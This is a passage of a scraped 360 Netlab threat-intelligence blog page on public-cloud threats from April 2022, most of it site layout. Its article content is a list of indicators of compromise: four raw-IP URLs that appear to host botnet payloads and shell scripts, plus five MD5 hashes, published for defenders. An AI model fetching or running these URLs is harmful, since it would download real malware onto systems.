<a class="vglnk" href="http://103.136.40.243/bins/Cronarm5" rel="nofollow"><span>http</span><span>://</span><span>103</span><span>.</span><span>136</span><span>.</span><span>40</span><span>.</span><span>243</span><span>/</span><span>bins</span><span>/</span><span>Cronarm5</span></a>
<a class="vglnk" href="http://103.136.40.243/z.sh" rel="nofollow"><span>http</span><span>://</span><span>103</span><span>.</span><span>136</span><span>.</span><span>40</span><span>.</span><span>243</span><span>/</span><span>z</span><span>.</span><span>sh</span></a>
<a class="vglnk" href="http://175.11.71.224:58786/i" rel="nofollow"><span>http</span><span>://</span><span>175</span><span>.</span><span>11</span><span>.</span><span>71</span><span>.</span><span>224</span><span>:</span><span>58786</span><span>/</span><span>i</span></a>
<a class="vglnk" href="http://119.179.214.255:48348/bin.sh" rel="nofollow"><span>http</span><span>://</span><span>119</span><span>.</span><span>179</span><span>.</span><span>214</span><span>.</span><span>255</span><span>:</span><span>48348</span><span>/</span><span>bin</span><span>.</span><span>sh</span></a>
</code></pre>
<p>md5：</p>
<pre><code>97c3be113298ba1cf7acd6159391bc8c
0f77be12a7951073144b264f4cc0bb27
fdadd6050aec5f744d8e4e7118f95fc6
eec5c6c219535fba3a0492ea8118b397
59ce0baba11893f90527fc951ac69912
</code></pre>

                    </div>
                </section>


                <footer class="post-full-footer">


                    
<section class="author-card">
        <span class="avatar-wrapper"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"></path></g></svg>
</span>
    <section class="author-card-content">
        <h4 class="author-card-name"><a href="/author/360netlab/">360Netlab</a></h4>
            <p>Read <a href="/author/360netlab/">more posts</a> by this author.</p>
    </section>
</section>
<div class="post-full-footer-right">
    <a class="author-card-button" href="/author/360netlab/">Read More</a>
</div>


                </footer>

                <div id="disqus_thread"><iframe id="dsq-app5068" name="dsq-app5068" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="https://disqus.com/embed/comments/?base=default&amp;f=blog-netlab-360&amp;t_i=ghost-6274c7d7341053000761ae51&amp;t_u=https%3A%2F%2Fblog.netlab.360.com%2Fpublic-cloud-threat-intelligence-202204%2F&amp;t_d=%E5%85%AC%E6%9C%89%E4%BA%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%88202204%EF%BC%89&amp;t_t=%E5%85%AC%E6%9C%89%E4%BA%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%88202204%EF%BC%89&amp;s_o=default#version=9db7f31f906666f4d56c3f4488ea0e6c" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 394px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
                <script>
                    var disqus_config = function () {
                        this.page.url = "https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/";
                        this.page.identifier = "ghost-6274c7d7341053000761ae51"
                    };
                    (function () {
                        var d = document, s = d.createElement('script');
                        s.src = 'https://blog-netlab-360.disqus.com/embed.js';
                        s.setAttribute('data-timestamp', +new Date());
                        (d.head || d.body).appendChild(s);
                    })();
                </script>

            </article>

        </div>
    </main>

    <aside class="read-next outer">
        <div class="inner">
            <div class="read-next-feed">
                <article class="read-next-card" style="background-image: url(https://blog.netlab.360.com/content/images/size/w600/2019/02/astronomy-constellation-dark-998641-4.jpg)">
                    <header class="read-next-card-header">
                        <small class="read-next-card-header-sitetitle">— 360 Netlab Blog - Network Security Research Lab at 360 —</small>
                        <h3 class="read-next-card-header-title"><a href="/tag/gong-you-yun-wei-xie-qing-bao/">公有云威胁情报</a></h3>
                    </header>
                    <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"></path></svg>
</div>
                    <div class="read-next-card-content">
                        <ul>
                            <li><a href="/public-cloud-threat-intelligence-202203/">公有云网络安全威胁情报（202203）</a></li>
                            <li><a href="/public-cloud-threat-intelligence-202202/">公有云网络安全威胁情报（202202）</a></li>
                            <li><a href="/public-cloud-threat-intelligence-202201/">公有云网络安全威胁情报（202201）</a></li>
                        </ul>
                    </div>
                    <footer class="read-next-card-footer">
                        <a href="/tag/gong-you-yun-wei-xie-qing-bao/">See all 6 posts →</a>
                    </footer>
                </article>


                <article class="post-card post tag-botnet tag-ddos no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/botnet-group-behind-attack-bjjkb/">

            <header class="post-card-header">
                    <span class="post-card-tags">Botnet</span>
                <h2 class="post-card-title">北京健康宝被网络攻击背后的数据分析</h2>
            </header>

            <section class="post-card-excerpt">
                <p>摘要 北京健康宝在4月28日遭遇DDoS攻击，各保障团队快速响应、通力合作，将攻击影响快速消弭。如同战场，一次攻击被消除，但只要黑恶势力还在，下一次攻击可能已经在路上。为此，我们有必要深度分析一下其背后的攻击团队，了解其规模及攻击手法，做到知彼知己。 通过360Netlab积累的多维度安全威胁数据，我们可以确定这次事件的发起方是我们内部命名为Rippr的团伙，它使用了已经披露过的恶意代码家族Fbot的作为攻击武器。如同现实世界的病毒一样，网络世界的恶意代码往往也基于旧有的恶意代码，不断地被一批又一批有“恶意目的”的人控制来演进、传播、利用。此次事件的Fbot变种，最早发现于2月10日，自被发现以来，它们就异常活跃地参与到DDoS攻击中。截至今日，短短三个月,被跟踪到的攻击事件就超过15w次。 本篇技术评论将带你深潜网络空间，在貌似平静的表面之下，看深渊的暗潮涌动。</p>
            </section>

        </a>

        <footer class="post-card-meta">

            <ul class="author-list">
                <li class="author-list-item">

                    <div class="author-name-tooltip">
                        LIU Ya
                    </div>

                        <a href="/author/liu/" class="static-avatar">
                            <img class="author-profile-image" src="https://blog.netlab.360.com/content/images/size/w100/2022/04/eclipse--3-.jpg" alt="LIU Ya">
                        </a>
                </li>
                <li class="author-list-item">

                    <div class="author-name-tooltip">
                        Alex.Turing
                    </div>

                        <a href="/author/alex/" class="static-avatar">
                            <img class="author-profile-image" src="https://blog.netlab.360.com/content/images/size/w100/2019/06/turing.PNG" alt="Alex.Turing">
                        </a>
                </li>
                <li class="author-list-item">

                    <div class="author-name-tooltip">
                        Hui Wang
                    </div>

                        <a href="/author/huiwang/" class="static-avatar">
                            <img class="author-profile-image" src="https://blog.netlab.360.com/content/images/size/w100/2017/05/WechatIMG1.jpeg" alt="Hui Wang">
                        </a>
                </li>
                <li class="author-list-item">

                    <div class="author-name-tooltip">
                        YANG XU
                    </div>

                        <a href="/author/xuy1202/" class="static-avatar">
                            <img class="author-profile-image" src="https://blog.netlab.360.com/content/images/size/w100/2019/04/head.jpg" alt="YANG XU">
                        </a>
                </li>
            </ul>

            <span class="reading-time">15 min read</span>

        </footer>

    </div>

</article>

            </div>
        </div>
    </aside>

    <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="https://blog.netlab.360.com/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon">
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">—</span>
    <div class="floating-header-title">公有云网络安全威胁情报（202204）</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"></path>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=%E5%85%AC%E6%9C%89%E4%BA%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%88202204%EF%BC%89&amp;url=https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/" onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/" onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"></path></svg>
        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0" max="11753">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>




        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> © 2022</section>
                <nav class="site-footer-nav">
                    <a href="https://blog.netlab.360.com">Latest Posts</a>
                    
                    <a href="https://twitter.com/360Netlab" target="_blank" rel="noopener">Twitter</a>
                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
                </nav>
            </div>
        </footer>

    </div>


    <script>
        var images = document.querySelectorAll('.kg-gallery-image img');
        images.forEach(function (image) {
            var container = image.closest('.kg-gallery-image');
            var width = image.attributes.width.value;
            var height = image.attributes.height.value;
            var ratio = width / height;
            container.style.flex = ratio + ' 1 0%';
        })
    </script>


    <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/built/jquery.fitvids.js?v=649c01aa08"></script>


        <script>

        // NOTE: Scroll performance is poor in Safari
        // - this appears to be due to the events firing much more slowly in Safari.
        //   Dropping the scroll event and using only a raf loop results in smoother
        //   scrolling but continuous processing even when not scrolling
        $(document).ready(function () {
            // Start fitVids
            var $postContent = $(".post-full-content");
            $postContent.fitVids();
            // End fitVids

            var progressBar = document.querySelector('#reading-progress');
            var header = document.querySelector('.floating-header');
            var title = document.querySelector('.post-full-title');

            var lastScrollY = window.scrollY;
            var lastWindowHeight = window.innerHeight;
            var lastDocumentHeight = $(document).height();
            var ticking = false;

            function onScroll() {
                lastScrollY = window.scrollY;
                requestTick();
            }

            function onResize() {
                lastWindowHeight = window.innerHeight;
                lastDocumentHeight = $(document).height();
                requestTick();
            }

            function requestTick() {
                if (!ticking) {
                    requestAnimationFrame(update);
                }
                ticking = true;
            }

            function update() {
                var trigger = title.getBoundingClientRect().top + window.scrollY;
                var triggerOffset = title.offsetHeight + 35;
                var progressMax = lastDocumentHeight - lastWindowHeight;

                // show/hide floating header
                if (lastScrollY >= trigger + triggerOffset) {
                    header.classList.add('floating-active');
                } else {
                    header.classList.remove('floating-active');
                }

                progressBar.setAttribute('max', progressMax);
                progressBar.setAttribute('value', lastScrollY);

                ticking = false;
            }

            window.addEventListener('scroll', onScroll, { passive: true });
            window.addEventListener('resize', onResize, false);

            update();

        });
    </script>


    



<iframe style="display: none;"></iframe></body></html>